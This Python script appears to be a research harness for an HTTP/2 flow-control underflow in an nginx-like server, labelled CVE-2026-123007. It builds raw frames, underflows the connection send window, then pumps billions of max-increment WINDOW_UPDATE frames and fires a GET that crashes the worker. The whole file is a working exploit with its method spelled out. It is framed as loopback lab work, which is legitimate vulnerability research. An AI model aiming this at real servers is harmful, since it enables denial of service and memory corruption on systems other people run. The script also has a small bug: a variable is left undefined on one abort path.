#!/usr/bin/env python3
"""Stage B wire-pure WINDOW_UPDATE pump — CVE-2026-123007 lab harness.

Owner-approved (DM #59): drive h2c->send_window from the proven mkC2
state (~2x MAX) to >= 2^63 with pure wire traffic — N standalone
max-increment connection WINDOW_UPDATE frames (13 bytes each),
pipelined in large batches with no sleeps and no debugger anywhere in
the loop — then (trigger mode) a fresh GET on stream 71 to run
ngx_http_v2_send_chain with the pumped ledger: the rung-3 consumer,
wire-pure.

Bootstrap (phases 0/A/B/C) is byte-identical to wuprobe.py, whose
ledger arithmetic is gdb-verified (wakes 6/9): after mkC2 the 1.31.8
guard expression (v2.c:2564) is underflowed and every further WU is
accepted (v2.c:2575).

Pump I/O is SINGLE-THREADED non-blocking select: the first calibration
attempt used a reader thread, and concurrent SSL_read + SSL_write on
one SSL object from two threads produced a spurious send failure (no
end-marker PONG, empty-str SSL exception). One thread, one state
machine — no race class at all.

Observability: the client never reads during bootstrap (charges stay
queued-unsent and refundable, exactly the wuprobe shape); after mkC2
the pump drains continuously — safe only from that point: the sole
live charge source is stream 1's 64 MiB blob (bounded, ~7e-12 of the
pumped ledger). Marker PINGs every MARKER frames; each PONG proves
the worker parsed and accepted every frame before the marker.
GOAWAY / EOF / reset / send-stall abort with the frame count
preserved (honest achieved-multiple record).

Ledger arithmetic (recorded, not debugger-read):
    R_final = R_C2 + frames_sent * (2^31-1) - drain_charges
    R_C2 = 4,295,065,598 (observed mkC2, wake 9)
The behavioral proof that the ledger crossed 2^63 is the trigger
itself (worker abort at the filter:1144 cast), plus the memcpy size
printed in the worker's ASan report.

Loopback only (127.0.0.1). Usage:
    wupump.py TOTAL_WUS TRIGGER(0|1) [MARKER_EVERY] [CAP_SECONDS]
"""
import json
import select
import socket
import ssl
import struct
import sys
import time

HOST, PORT = "127.0.0.1", 8443
MAX_WINDOW = 0x7FFFFFFF
W1 = MAX_WINDOW - 65535          # -> connection send_window = MAX (pre-blob)
CHUNK = 65536                    # per-cycle charge/refill unit (wuprobe parity)
CYCLES = 33                      # R crosses MAX at cycle 33 (observed)
BIG_WU = 0x7FFFFFFF              # max-increment standalone WU
R_C2 = 4295065598                # observed mkC2 ledger (wake 9)

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
FT_DATA, FT_HEADERS, FT_RST, FT_SETTINGS = 0, 1, 3, 4
FT_PING, FT_GOAWAY, FT_WU = 6, 7, 8
FLAG_ACK, FLAG_END_STREAM, FLAG_END_HEADERS = 0x1, 0x1, 0x4
RST_CANCEL = 8

TRIGGER_SID = 71                 # first odd sid unused after bootstrap
BATCH_BYTES = 8 << 20            # pipelined batch (~645k WUs)
HEARTBEAT_BATCHES = 64           # progress line every ~512 MB of wire
DEFAULT_MARKER = 1 << 28         # 16 markers over the full 2^32-WU pump
DEFAULT_CAP = 21600              # 6 h hard client-side wall-clock cap
SEND_STALL_TIMEOUT = 600         # select-level: abort if unwritable that long
END_WAIT = 120                   # s to wait for the end-marker PONG
TRIGGER_WAIT = 180               # s to wait for the worker to die post-trigger


def frame(ftype, flags, sid, payload=b""):
    return len(payload).to_bytes(3, "big") + bytes([ftype, flags]) + \
        struct.pack(">I", sid) + payload


def window_update(sid, inc):
    return frame(FT_WU, 0, sid, struct.pack(">I", inc))


def rst(sid, status=RST_CANCEL):
    return frame(FT_RST, 0, sid, struct.pack(">I", status))


def ping(marker):
    assert len(marker) == 8
    return frame(FT_PING, 0, 0, marker)


def headers_block():
    return bytes([0x82, 0x87, 0x44, 5]) + b"/blob" + \
        bytes([0x41, 9]) + b"localhost"


def get_blob(sid):
    return frame(FT_HEADERS, FLAG_END_HEADERS | FLAG_END_STREAM, sid,
                 headers_block())


class Parser:
    """In-line HTTP/2 frame parser for the drain direction. No locks,
    no thread: the pump loop feeds it."""

    def __init__(self):
        self.buf = bytearray()
        self.pongs = {}          # 8-byte marker -> wall time
        self.data_bytes = 0      # DATA payload drained (ledger charge)
        self.frames = 0
        self.goaway = None       # GOAWAY error code, or None
        self.dead = None         # "eof" / exception repr, or None
        self.dead_time = None

    def feed(self, chunk):
        self.buf += chunk
        while len(self.buf) >= 9:
            ln = int.from_bytes(self.buf[0:3], "big")
            if len(self.buf) < 9 + ln:
                return
            ftype, flags = self.buf[3], self.buf[4]
            payload = bytes(self.buf[9:9 + ln])
            del self.buf[:9 + ln]
            self.frames += 1
            if ftype == FT_DATA:
                self.data_bytes += ln
            elif ftype == FT_PING and flags & FLAG_ACK:
                self.pongs[payload[:8]] = time.time()
            elif ftype == FT_GOAWAY and self.goaway is None:
                self.goaway = (int.from_bytes(payload[4:8], "big")
                               if len(payload) >= 8 else -1)

    def ponged(self, marker):
        return marker in self.pongs


def main():
    argv = sys.argv[1:]
    total = int(argv[0])
    trigger = bool(int(argv[1])) if len(argv) > 1 and argv[1] else False
    marker_every = int(argv[2]) if len(argv) > 2 and argv[2] else \
        DEFAULT_MARKER
    cap_s = int(argv[3]) if len(argv) > 3 and argv[3] else DEFAULT_CAP

    t0 = time.time()
    out = {"argv": argv, "phase": "connect", "r_c2": R_C2,
           "big_wu": BIG_WU, "total": total, "trigger": trigger,
           "marker_every": marker_every, "cap_s": cap_s}

    def emit(**kw):
        out.update(kw)
        out["t"] = round(time.time() - t0, 3)
        print(json.dumps(out), flush=True)

    def ledger_est(sent):
        return R_C2 + sent * BIG_WU - ps.data_bytes

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 8192)
    sock.connect((HOST, PORT))
    tls = ctx.wrap_socket(sock, server_hostname="localhost")

    # ---- bootstrap: byte-identical to wuprobe.py phases 0/A/B/C ----
    settings = struct.pack(">HI", 0x4, MAX_WINDOW)   # INITIAL_WINDOW_SIZE
    tls.sendall(PREFACE + frame(FT_SETTINGS, 0, 0, settings)
                + window_update(0, W1) + get_blob(1))
    time.sleep(3)                                     # burst blocks socket
    tls.sendall(ping(b"mkA0ping"))                    # A0: MAX - blob_charge

    # phase A: one interleave on stream 3 (mechanism parity with wuprobe)
    tls.sendall(get_blob(3))
    time.sleep(1.5)                                   # charge 65536
    tls.sendall(ping(b"mkA1ping"))
    tls.sendall(window_update(0, CHUNK))              # refill
    time.sleep(0.5)
    tls.sendall(ping(b"mkA2ping"))
    tls.sendall(rst(3))                              # refund on top
    time.sleep(1.5)
    tls.sendall(ping(b"mkA3ping"))                    # A3: R = A2 + 65536

    # phase B: pump CYCLES interleaves; R crosses MAX at cycle 33
    for i in range(CYCLES):
        sid = 5 + 2 * i
        tls.sendall(get_blob(sid) + window_update(0, CHUNK) + rst(sid))
        if i % 10 == 9:
            time.sleep(0.3)
    time.sleep(2)
    tls.sendall(ping(b"mkB1ping"))                    # B1: MAX + 32768

    # phase C: standalone WU while R > MAX -> guard wrap
    tls.sendall(window_update(0, CHUNK))
    time.sleep(1.0)
    tls.sendall(ping(b"mkC1ping"))                    # C1: underflow credit
    tls.sendall(window_update(0, BIG_WU))             # 2^31-1 accepted
    time.sleep(1.0)
    tls.sendall(ping(b"mkC2ping"))                    # C2: ~2x MAX
    emit(phase="mkC2-sent")

    # ---- pump mode: single-threaded non-blocking select loop ----
    tls.setblocking(False)
    tls.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4 << 20)
    ps = Parser()

    def recv_avail():
        """Drain all immediately-available decrypted bytes into ps."""
        while ps.dead is None:
            try:
                chunk = tls.recv(262144)
            except ssl.SSLWantReadError:
                return
            except Exception as e:
                ps.dead = "%s: %s" % (type(e).__name__, e)
                ps.dead_time = time.time()
                return
            if chunk == b"":
                ps.dead = "eof"
                ps.dead_time = time.time()
                return
            ps.feed(chunk)

    def send_full(data):
        """Non-blocking full send. True = sent; False = stall or death
        (details recorded in ps / returned reason)."""
        deadline = time.time() + SEND_STALL_TIMEOUT
        mv = memoryview(data)
        off = 0
        while off < len(mv):
            try:
                n = tls.send(mv[off:])
                off += n if n else 0
            except ssl.SSLWantWriteError:
                now = time.time()
                if now >= deadline:
                    return False
                select.select([], [tls], [], min(deadline - now, 5.0))
            except ssl.SSLWantReadError:
                recv_avail()          # satisfy the read side, then retry
                if ps.dead:
                    return False
            except Exception as e:
                ps.dead = "send %s: %s" % (type(e).__name__, e)
                ps.dead_time = time.time()
                return False
        return True

    def server_gone():
        return ps.dead is not None or ps.goaway is not None

    wu = window_update(0, BIG_WU)                      # 13 bytes
    fpb = BATCH_BYTES // 13
    batch = wu * fpb
    sent, batches, mk, abort_reason = 0, 0, 0, None
    next_marker = marker_every
    pump_t0 = time.time()

    while sent < total:
        n = min(fpb, total - sent)
        if not send_full(batch if n == fpb else batch[:n * 13]):
            abort_reason = "send-stall/dead %s %s" % (ps.dead, ps.goaway)
            break
        sent += n
        batches += 1
        recv_avail()
        if server_gone():
            abort_reason = "server-dead goaway=%s %s" % (ps.goaway, ps.dead)
            break
        if sent >= next_marker:
            mk += 1
            next_marker += marker_every
            if not send_full(ping(("WP%06d" % mk).encode())):
                abort_reason = "marker-send-fail %s %s" % (ps.dead,
                                                          ps.goaway)
                break
            recv_avail()
            emit(phase="marker", marker=mk, sent=sent,
                 ledger_est=ledger_est(sent),
                 rate=round(sent / (time.time() - pump_t0), 1),
                 drained=ps.data_bytes, frames_in=ps.frames,
                 goaway=ps.goaway, dead=ps.dead)
        elif batches % HEARTBEAT_BATCHES == 0:
            emit(phase="beat", sent=sent, ledger_est=ledger_est(sent),
                 rate=round(sent / (time.time() - pump_t0), 1),
                 drained=ps.data_bytes, frames_in=ps.frames,
                 goaway=ps.goaway, dead=ps.dead)
        if time.time() - pump_t0 > cap_s:
            abort_reason = "cap"
            break

    # ---- end-of-pump prefix proof ----
    end_marker = b"mkXPping"
    if not server_gone():
        if send_full(ping(end_marker)):
            deadline = time.time() + END_WAIT
            while time.time() < deadline:
                recv_avail()
                if ps.ponged(end_marker) or server_gone():
                    break
                select.select([tls], [], [], 0.2)
            end_ponged = ps.ponged(end_marker)
        else:
            abort_reason = (abort_reason or "") + \
                " end-ping-fail %s %s" % (ps.dead, ps.goaway)

    # ---- trigger: fresh GET runs send_chain with the pumped ledger ----
    triggered = False
    if trigger and abort_reason is None and sent == total:
        if send_full(get_blob(TRIGGER_SID)):
            deadline = time.time() + TRIGGER_WAIT
            while time.time() < deadline:
                recv_avail()
                if server_gone():
                    break
                select.select([tls], [], [], 0.2)
            triggered = ps.dead is not None and ps.goaway is None

    emit(phase="done", sent=sent, total=total, abort=abort_reason,
         ledger_est=ledger_est(sent),
         rate=round(sent / (time.time() - pump_t0), 1) if sent else 0,
         elapsed=round(time.time() - t0, 3),
         end_ponged=end_ponged,
         pongs={k.decode(): round(v - t0, 3) for k, v in ps.pongs.items()},
         drained=ps.data_bytes, frames_in=ps.frames,
         goaway=ps.goaway, dead=ps.dead,
         dead_time=(round(ps.dead_time - t0, 3)
                    if ps.dead_time else None),
         triggered=triggered)
    sys.exit(0 if sent == total and not abort_reason else 3)


if __name__ == "__main__":
    main()
